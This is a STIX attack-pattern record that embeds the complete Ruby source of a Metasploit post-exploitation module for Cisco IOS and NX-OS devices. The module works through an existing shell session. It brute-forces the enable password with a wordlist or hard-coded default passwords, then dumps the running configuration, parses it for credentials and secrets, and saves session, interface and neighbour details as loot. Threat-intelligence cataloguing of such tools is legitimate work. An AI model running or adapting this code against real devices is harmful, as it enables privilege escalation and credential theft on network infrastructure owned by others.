{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0a0abed5-359d-4a17-9cec-b9813d96ccc5",
    "created": "2024-08-14T16:33:17.992185Z",
    "modified": "2024-08-14T16:33:17.992189Z",
    "name": "Cisco Gather Device General Information",
    "description": " This module collects a Cisco IOS or NXOS device information and configuration.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/networking/gather/enum_cisco.rb",
            "external_id": "enum_cisco.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Cisco\n  include Msf::Exploit::Deprecated\n  moved_from 'post/cisco/gather/enum_cisco'\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Cisco Gather Device General Information',\n        'Description' => %q{\n          This module collects a Cisco IOS or NXOS device information and configuration.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],\n        'Platform' => [ 'cisco'],\n        'SessionTypes' => [ 'shell' ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('ENABLE', [ false, 'Enable password for changing privilege level.']),\n        OptPath.new('WORDLIST', [false, 'Wordlist of possible enable passwords to try.'])\n      ]\n    )\n  end\n\n  def run\n    # Get device prompt\n    prompt = session.shell_command('')\n\n    # Set terminal length to 0 so no paging is required\n    session.shell_write(\"term len 0 \\n\")\n\n    # Get version info\n    print_status('Getting version information')\n    show_ver_cmd = 'show version'\n    ver_out = session.shell_command(show_ver_cmd)\n    ver = ver_out.gsub(/show version/, '')\n\n    # Get current privilege level\n    print_status('Getting privilege level')\n    priv_cmd = 'show priv'\n    priv = session.shell_command(priv_cmd).scan(/privilege level is (\\d*)/).join\n\n    # Check if this is a Nexus or IOS box\n    case ver\n    when /Nexus/\n      os_type = 'Nexus'\n      mode = 'EXEC'\n    when /IOS/\n      os_type = 'IOS'\n    end\n    if os_type == 'IOS'\n      case prompt\n      when />/\n        mode = 'EXEC'\n      when /#/\n        mode = 'PRIV'\n      end\n    end\n\n    print_status(\"The device OS is #{os_type}\")\n    print_status(\"Session running in mode #{mode}\")\n    print_status(\"Privilege level #{priv}\")\n\n    case os_type\n    when /IOS/\n      ver_loc = store_loot('cisco.ios.version',\n                           'text/plain',\n                           session,\n                           ver.strip,\n                           'version.txt',\n                           'Cisco IOS Version')\n    when /Nexus/\n      ver_loc = store_loot('cisco.nxos.version',\n                           'text/plain',\n                           session,\n                           ver.strip,\n                           'version.txt',\n                           'Cisco NXOS Version')\n    end\n\n    # Print the version of VERBOSE set to true.\n    vprint_good(\"version information stored in to loot, file:#{ver_loc}\")\n\n    # Enumerate depending priv level\n    case priv\n    when '1'\n      enum_exec(prompt)\n      if get_enable(datastore['ENABLE'], datastore['WORDLIST'])\n        enum_priv(prompt)\n      end\n    when /7|15/\n      enum_exec(prompt)\n      enum_priv(prompt)\n    end\n  end\n\n  def get_enable(enable_pass, pass_file)\n    if enable_pass\n      found = false\n      session.shell_command('enable').to_s.strip\n      en_out = session.shell_command(enable_pass)\n      if en_out =~ /Password:/\n        print_error('Failed to change privilege level using provided Enable password.')\n      else\n        found = true\n      end\n    else\n      if pass_file\n        if !::File.exist?(pass_file)\n          print_error(\"Wordlist File #{pass_file} does not exist!\")\n          return\n        end\n        creds = ::File.open(pass_file, 'rb')\n      else\n        creds = \"Cisco\\n\" << \"cisco\\n\" << \"sanfran\\n\" << \"SanFran\\n\" << \"password\\n\" << \"Password\\n\"\n      end\n      print_status('Trying to get higher privilege level with common Enable passwords..')\n\n      # Try just the enable command\n      en_out = session.shell_command('enable').to_s.strip\n      if en_out =~ /Password:/\n        creds.each_line do |p|\n          next if p.strip.empty?\n          next if p[0, 1] == '#'\n\n          print_status(\"\\tTrying password #{p.strip}\")\n          pass_out = session.shell_command(p.strip).to_s.strip\n          vprint_status(\"Response: #{pass_out}\")\n          session.shell_command('enable').to_s.strip if pass_out =~ /Bad secrets/\n          found = true if pass_out =~ /#/\n          break if found\n        end\n      else\n        found = true\n      end\n    end\n    if found\n      print_good('Obtained higher privilege level.')\n      return true\n    else\n      print_error('Could not obtain higher privilege level.')\n      return false\n    end\n  end\n\n  # Run enumeration commands for when privilege level is 7 or 15\n  def enum_priv(prompt)\n    host = session.session_host\n    port = session.session_port\n    priv_commands = [\n      {\n        'cmd' => 'show run',\n        'fn' => 'run_config',\n        'desc' => 'Cisco Device running configuration'\n      },\n      {\n        'cmd' => 'show cdp neigh',\n        'fn' => 'cdp_neighbors',\n        'desc' => 'Cisco Device CDP Neighbors'\n      },\n      {\n        'cmd' => 'show lldp neigh',\n        'fn' => 'cdp_neighbors',\n        'desc' => 'Cisco Device LLDP Neighbors'\n      }\n    ]\n    priv_commands.each do |ec|\n      cmd_out = session.shell_command(ec['cmd']).gsub(/#{ec['cmd']}|#{prompt}/, '')\n      # also look at line number so we dont invalidate large outputs by something at the end\n      next if cmd_out.split(\"\\n\").length < 2 && cmd_out =~ /Invalid input|%/\n\n      print_status(\"Gathering info from #{ec['cmd']}\")\n      # Process configuration\n      if ec['cmd'] =~ /show run/\n        print_status('Parsing running configuration for credentials and secrets...')\n        cisco_ios_config_eater(host, port, cmd_out)\n      end\n      cmd_loc = store_loot(\"cisco.ios.#{ec['fn']}\",\n                           'text/plain',\n                           session,\n                           cmd_out.strip,\n                           \"#{ec['fn']}.txt\",\n                           ec['desc'])\n      vprint_good(\"Saving to #{cmd_loc}\")\n    end\n  end\n\n  # run commands found in exec mode under privilege 1\n  def enum_exec(prompt)\n    exec_commands = [\n      {\n        'cmd' => 'show ssh',\n        'fn' => 'ssh_sessions',\n        'desc' => 'SSH Sessions on Cisco Device'\n      },\n      {\n        'cmd' => 'show sessions',\n        'fn' => 'telnet_sessions',\n        'desc' => 'Telnet Sessions on Cisco Device'\n      },\n      {\n        'cmd' => 'show login',\n        'fn' => 'login_settings',\n        'desc' => 'Login settings on Cisco Device'\n      },\n      {\n        'cmd' => 'show ip interface brief',\n        'fn' => 'interface_info',\n        'desc' => 'IP Enabled Interfaces on Cisco Device'\n      },\n      {\n        'cmd' => 'show inventory',\n        'fn' => 'hw_inventory',\n        'desc' => 'Hardware component inventory for Cisco Device'\n      }\n    ]\n    exec_commands.each do |ec|\n      cmd_out = session.shell_command(ec['cmd']).gsub(/#{ec['cmd']}|#{prompt}/, '')\n      next if cmd_out =~ /Invalid input|%/\n\n      print_status(\"Gathering info from #{ec['cmd']}\")\n      cmd_loc = store_loot(\"cisco.ios.#{ec['fn']}\",\n                           'text/plain',\n                           session,\n                           cmd_out.strip,\n                           \"#{ec['fn']}.txt\",\n                           ec['desc'])\n      vprint_good(\"Saving to #{cmd_loc}\")\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'cisco']"
    ]
}